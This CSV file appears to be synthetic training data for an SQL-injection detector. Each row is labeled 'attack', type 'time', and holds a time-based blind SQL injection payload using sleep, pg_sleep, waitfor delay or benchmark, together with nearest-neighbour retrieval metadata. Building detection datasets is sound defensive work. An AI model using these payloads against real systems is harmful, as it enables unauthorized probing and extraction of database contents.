id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000173,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""jenb"" like ""jenb",nearest_attack_euclidean,R000537,0.44094259275507114
SMOTE_000174,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar",nearest_attack_euclidean,R000095,0.009579696082665835
SMOTE_000175,attack,time,select pg_sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000431,0.8151225968702724
SMOTE_000176,attack,time,waitfor delay '0:0:5' and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000191,1.3221131764154195
SMOTE_000177,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000401,0.1564980781148004
SMOTE_000178,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,nearest_attack_euclidean,R000421,0.3240634656947062
SMOTE_000179,attack,time,1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000599,0.5488548067639308
SMOTE_000180,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000731,0.04856768820959321
SMOTE_000181,attack,time,1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000313,0.07035991444464909
SMOTE_000182,attack,time,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",nearest_attack_euclidean,R000250,0.8934397210037343
SMOTE_000183,attack,time,"1   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000240,0.06715280194216611
SMOTE_000184,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000296,4.793192407750564
SMOTE_000185,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,1.5285817711204177
SMOTE_000186,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000554,0.5711522593194881
SMOTE_000187,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,nearest_attack_euclidean,R000112,0.7711922524572058
SMOTE_000188,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000141,0.05254915363659615
SMOTE_000189,attack,time,"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000553,0.45726562177967667
SMOTE_000190,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000759,0.27442495683720985
SMOTE_000191,attack,time,"select pg_sleep  (  5  )   and    (    (     (  ""nvuv"" like ""nvuv",nearest_attack_euclidean,R000246,0.4704889893088996
SMOTE_000192,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""%""  =  """,nearest_attack_euclidean,R000670,0.039185499694224295
SMOTE_000193,attack,time,1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000696,1.0843369389773136
SMOTE_000194,attack,time,1  )   as mixt where 1085  =  1085 or sleep  (  5  )  --,nearest_attack_euclidean,R000710,0.7019378192907059
SMOTE_000195,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000610,1.086597685990926
SMOTE_000196,attack,time,"1%'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000638,0.3004544405765223
SMOTE_000197,attack,time,1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000532,0.07787378049158164
SMOTE_000198,attack,time, (  select   (  case when   (  9856  =  9856  )   then sleep  (  5  )   else 9856*  (  select 9856 from information_schema.character_sets  )   end   )    ) ,nearest_attack_euclidean,R000132,1.2208202343442998
SMOTE_000199,attack,time,1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000622,0.13868423811986655
SMOTE_000200,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000563,1.0429983824628641
SMOTE_000201,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000601,0.171865604928484
SMOTE_000202,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000287,0.30639675655978027
SMOTE_000203,attack,time,"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",nearest_attack_euclidean,R000439,0.04796648000596694
SMOTE_000204,attack,time,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000321,0.31094862563737624
SMOTE_000205,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.2461915548606898
SMOTE_000206,attack,time,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",nearest_attack_euclidean,R000374,0.5353968662499219
SMOTE_000207,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000550,0.5269513203000166
SMOTE_000208,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000660,0.1308210874049461
SMOTE_000209,attack,time,"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000703,0.5752105805441129
SMOTE_000210,attack,time,select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx,nearest_attack_euclidean,R000620,0.15641004728717822
SMOTE_000211,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",nearest_attack_euclidean,R000545,1.5926189063489444
SMOTE_000212,attack,time,1'  )   rlike sleep  (  5  )   and   (  'qsub' like 'qsub,nearest_attack_euclidean,R000779,0.4887712821942156
SMOTE_000213,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000761,1.9147506118782813
SMOTE_000214,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000473,0.16277686274631828
SMOTE_000215,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,0.5768509671703472
SMOTE_000216,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000377,0.12818013873839054
SMOTE_000217,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000384,0.8046207676131196
SMOTE_000218,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000475,1.117797410041909
SMOTE_000219,attack,time,1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000396,0.04215037281274419
SMOTE_000220,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000692,0.9775154255690865
SMOTE_000221,attack,time,"1"" and sleep  (  5  )  ",nearest_attack_euclidean,R000676,0.6506588964197174
SMOTE_000222,attack,time,begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,nearest_attack_euclidean,R000325,0.23820679319328522
SMOTE_000223,attack,time,select sleep  (  5   )    )   ||',nearest_attack_euclidean,R000348,1.6453431028975218
SMOTE_000224,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,0.057738497630150015
SMOTE_000225,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,nearest_attack_euclidean,R000758,0.7636202186956903
SMOTE_000226,attack,time,1' waitfor delay '0:0:5' and 'dtej' like 'dtej,nearest_attack_euclidean,R000652,0.678422727643572
SMOTE_000227,attack,time,1 where 7299  =  7299 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000543,0.411938716927501
SMOTE_000228,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""hdis"" like ""hdis",nearest_attack_euclidean,R000634,0.48863940364558334
SMOTE_000229,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000582,0.8282322531527175
SMOTE_000230,attack,time,1%'   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000452,0.13327488030757237
SMOTE_000231,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ",nearest_attack_euclidean,R000129,0.25891054932096014
SMOTE_000232,attack,time,1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000458,0.20568815348384564
SMOTE_000233,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   4982  =  4982,nearest_attack_euclidean,R000535,0.4790279832668387
SMOTE_000234,attack,time,1'+  (  select mrdi where 7451  =  7451 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000594,0.6868137506342562
SMOTE_000235,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000428,1.1319019104200525
SMOTE_000236,attack,time,"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000319,0.30957646025464247
SMOTE_000237,attack,time,1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000622,0.5750483161913397
SMOTE_000238,attack,time,"1"" where 9521  =  9521 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",nearest_attack_euclidean,R000538,0.8416445159216096
SMOTE_000239,attack,time,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",nearest_attack_euclidean,R000639,0.5507477526623185
SMOTE_000240,attack,time,"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000502,1.2141230402119128
SMOTE_000241,attack,time,1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000425,1.0278672326139453
SMOTE_000242,attack,time,"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",nearest_attack_euclidean,R000709,0.22167098354211237
SMOTE_000243,attack,time,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,nearest_attack_euclidean,R000644,0.06045133480078131
SMOTE_000244,attack,time,"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000353,0.0018389122747494032
SMOTE_000245,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",nearest_attack_euclidean,R000278,0.04176678496128305
SMOTE_000246,attack,time,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000570,0.10271555784385329
SMOTE_000247,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000146,0.12442176203161039
SMOTE_000248,attack,time,1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,nearest_attack_euclidean,R000571,1.1741570698606612
SMOTE_000249,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,1.2086608475366278
SMOTE_000250,attack,time,"1'+  (  select 'kqnj' where 9483  =  9483 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000432,0.7378624113800358
SMOTE_000251,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000171,0.20866456910736914
SMOTE_000252,attack,time,"1'+  (  select jley where 3581  =  3581 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000679,1.019363725279368
SMOTE_000253,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""btht""  =  ""btht",nearest_attack_euclidean,R000770,0.348173603596791
SMOTE_000254,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.6258497453634861
SMOTE_000255,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   # irvm",nearest_attack_euclidean,R000496,0.10013567320220601
SMOTE_000256,attack,time,"select pg_sleep  (  5  )   and ""zhsc""  =  ""zhsc",nearest_attack_euclidean,R000445,1.0525601060063976
SMOTE_000257,attack,time,1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000405,0.26460141103267576
SMOTE_000258,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000264,0.5741644651144499
SMOTE_000259,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000563,0.37407247720975223
SMOTE_000260,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,0.3496525534595305
SMOTE_000261,attack,time,"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000725,0.3417168806022447
SMOTE_000262,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,0.004552970005106899
SMOTE_000263,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.291669069846158
SMOTE_000264,attack,time,select sleep  (  5  )   and    (    (   'srfc' like 'srfc,nearest_attack_euclidean,R000204,0.3139077308474878
SMOTE_000265,attack,time,"1"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000359,0.9754929332407586
SMOTE_000266,attack,time,select sleep  (  5  )   and    (    (   'keoy'  =  'keoy,nearest_attack_euclidean,R000175,0.021098334194567008
SMOTE_000267,attack,time,"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000081,0.014235640609414435
SMOTE_000268,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,3.11492495256943
SMOTE_000269,attack,time,1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000273,0.10186906961093262
SMOTE_000270,attack,time,"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""iuxs"" like ""iuxs",nearest_attack_euclidean,R000639,1.1454251642235478
SMOTE_000271,attack,time,"1""   )    )     )   and sleep  (  5  )   and    (    (     (  ""bvgg""  =  ""bvgg",nearest_attack_euclidean,R000690,0.5512363217163083
SMOTE_000272,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000473,0.5193575818477085
SMOTE_000273,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000501,1.478695900650013
SMOTE_000274,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000481,0.7064718281773529
SMOTE_000275,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000760,0.21113609189523583
SMOTE_000276,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000718,0.0755319189799392
SMOTE_000277,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R000352,0.7995271667862958
SMOTE_000278,attack,time,1'+  (  select shec where 3589  =  3589 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000425,0.11684326315661736
SMOTE_000279,attack,time,"1"" where 8697  =  8697 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000233,1.0059172963630083
SMOTE_000280,attack,time,"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",nearest_attack_euclidean,R000439,0.025158088145534913
SMOTE_000281,attack,time,"1""   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   ""fbol"" like ""fbol",nearest_attack_euclidean,R000616,0.6422442909028733
SMOTE_000282,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  ""avyw""  =  ""avyw",nearest_attack_euclidean,R000245,0.6018520171360694
SMOTE_000283,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'nlrk' like 'nlrk",nearest_attack_euclidean,R000251,0.7126944342984379
SMOTE_000284,attack,time,1  )   where 7165  =  7165 and sleep  (  5  )  #,nearest_attack_euclidean,R000721,0.9245206488823292
SMOTE_000285,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,0.6710089095504652
SMOTE_000286,attack,time,1  )   where 2734  =  2734 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000199,0.9901945875861735
SMOTE_000287,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000699,1.2806760520583549
SMOTE_000288,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh,nearest_attack_euclidean,R000740,0.04354601613811749
SMOTE_000289,attack,time,1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000513,0.7997127175434647
SMOTE_000290,attack,time,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""zvew"" like ""zvew",nearest_attack_euclidean,R000174,0.2177946640576939
SMOTE_000291,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000692,0.8194464481325331
SMOTE_000292,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond",nearest_attack_euclidean,R000119,0.4078269657449813
SMOTE_000293,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,0.7221600807546587
SMOTE_000294,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.7539260752604097
SMOTE_000295,attack,time,1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000555,0.18025342063320832
SMOTE_000296,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000635,0.8858393677697033
SMOTE_000297,attack,time,"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000699,0.45302797707016124
SMOTE_000298,attack,time,"select sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000202,0.46635525934404737
SMOTE_000299,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000079,0.9860857111767194
SMOTE_000300,attack,time,"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000726,0.9104414597926069
SMOTE_000301,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000635,0.13743315066113143
SMOTE_000302,attack,time,select sleep  (  5  )  -- waln,nearest_attack_euclidean,R000294,0.024416511272876123
SMOTE_000303,attack,time,"1"" where 2677  =  2677 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",nearest_attack_euclidean,R000345,0.300732890134134
SMOTE_000304,attack,time,"1""  )   as eefe where 5290  =  5290 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000502,1.0966497826922321
SMOTE_000305,attack,time,select pg_sleep  (  5  )   and   (  '%'  =  ',nearest_attack_euclidean,R000431,0.6288438529870871
SMOTE_000306,attack,time,1' where 4473  =  4473 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000453,1.214542520371038
SMOTE_000307,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000110,0.15639706397371378
SMOTE_000308,attack,time,"1'  )   where 6731  =  6731 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000474,0.5041027509853475
SMOTE_000309,attack,time,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000249,0.47821943133378325
SMOTE_000310,attack,time,1  )   where 6950  =  6950 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000585,0.5689560332829384
SMOTE_000311,attack,time,1  )   where 2199  =  2199 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000313,0.27748099494661965
SMOTE_000312,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.7277332968459903
SMOTE_000313,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,0.38201625398921796
SMOTE_000314,attack,time,"1'  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000333,0.44142469303354914
SMOTE_000315,attack,time,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000398,0.49060945829968106
SMOTE_000316,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.9997223539640387
SMOTE_000317,attack,time,1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000360,0.37470389509096935
SMOTE_000318,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,0.01617829530840151
SMOTE_000319,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",nearest_attack_euclidean,R000278,0.3660761900066314
SMOTE_000320,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000581,1.0030169385164165
SMOTE_000321,attack,time,"1'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   'fele'  =  'fele",nearest_attack_euclidean,R000312,0.5129109341261501
SMOTE_000322,attack,time,"1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000123,0.5175817785144209
SMOTE_000323,attack,time,"1%'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000673,0.07498917895134367
SMOTE_000324,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000741,0.6882351690009625
SMOTE_000325,attack,time,1%'   )    )    and sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000667,0.325934601276954
SMOTE_000326,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000130,1.5961654429383667
SMOTE_000327,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000315,0.4185585813050528
SMOTE_000328,attack,time,"1""   )    )     )   waitfor delay '0:0:5'--",nearest_attack_euclidean,R000223,1.0973388229020433
SMOTE_000329,attack,time,1 and sleep  (  5  )  # qcyj,nearest_attack_euclidean,R000589,0.1296838396951499
SMOTE_000330,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000388,0.6629301645842962
SMOTE_000331,attack,time,"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000518,0.02400713943744431
SMOTE_000332,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,nearest_attack_euclidean,R000718,0.0972006529615803
SMOTE_000333,attack,time,1'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000194,1.0737323817669444
SMOTE_000334,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.232547593516119
SMOTE_000335,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000243,0.4355699064018993
SMOTE_000336,attack,time,"1%""   )    )     )   or sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000370,0.65149783449015
SMOTE_000337,attack,time,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'svwr'  =  'svwr,nearest_attack_euclidean,R000544,0.010585047205090865
SMOTE_000338,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000173,0.5445177330847413
SMOTE_000339,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R000261,0.6841901676284491
SMOTE_000340,attack,time,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000386,0.3606672479945944
SMOTE_000341,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000290,0.6939743056407826
SMOTE_000342,attack,time,"1%'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000706,0.6514037705435141
SMOTE_000343,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000286,1.6711179681743389
